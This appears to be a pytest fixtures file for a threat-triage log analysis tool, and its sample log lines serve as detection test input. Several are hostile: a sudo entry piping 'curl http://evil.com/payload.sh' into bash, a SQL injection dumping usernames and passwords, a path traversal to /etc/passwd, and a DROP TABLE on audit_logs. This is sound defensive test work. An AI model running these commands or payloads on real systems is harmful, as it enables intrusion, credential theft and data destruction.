"""Test fixtures and configuration."""

from __future__ import annotations

import pytest

from threattriage.parsers.base import create_registry
from threattriage.analysis.detection import DetectionEngine
from threattriage.analysis.anomaly import AnomalyDetector
from threattriage.analysis.correlator import AlertCorrelator
from threattriage.analysis.mitre_mapper import MitreMapper
from threattriage.analysis.scorer import SeverityScorer


@pytest.fixture
def parser_registry():
    return create_registry()


@pytest.fixture
def detection_engine():
    return DetectionEngine()


@pytest.fixture
def anomaly_detector():
    return AnomalyDetector()


@pytest.fixture
def correlator():
    return AlertCorrelator()


@pytest.fixture
def mitre_mapper():
    return MitreMapper()


@pytest.fixture
def scorer():
    return SeverityScorer()


# ─── Sample Log Lines ─────────────────────────────────────────────────────────

@pytest.fixture
def syslog_failed_ssh():
    return 'Mar  5 08:23:41 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2'


@pytest.fixture
def syslog_sudo():
    return 'Mar  5 08:24:15 webserver01 sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://evil.com/payload.sh | bash'


@pytest.fixture
def http_sqli():
    return '45.33.32.156 - - [05/Mar/2024:09:00:00 +0000] "GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 4521 "-" "sqlmap/1.7.2#stable"'


@pytest.fixture
def http_path_traversal():
    return '192.42.116.16 - - [05/Mar/2024:09:15:00 +0000] "GET /../../../../../../etc/passwd HTTP/1.1" 400 326 "-" "nikto/2.1.6"'


@pytest.fixture
def http_normal():
    return '10.0.0.100 - admin [05/Mar/2024:12:00:00 +0000] "GET /api/v1/health HTTP/1.1" 200 64 "-" "HealthChecker/1.0"'


@pytest.fixture
def db_bulk_select():
    return "2024-03-05 09:00:00 UTC [5432] appuser@production LOG:  statement: SELECT * FROM users;"


@pytest.fixture
def db_drop_table():
    return "2024-03-05 10:00:00 UTC [5434] dba@production LOG:  statement: DROP TABLE audit_logs;"
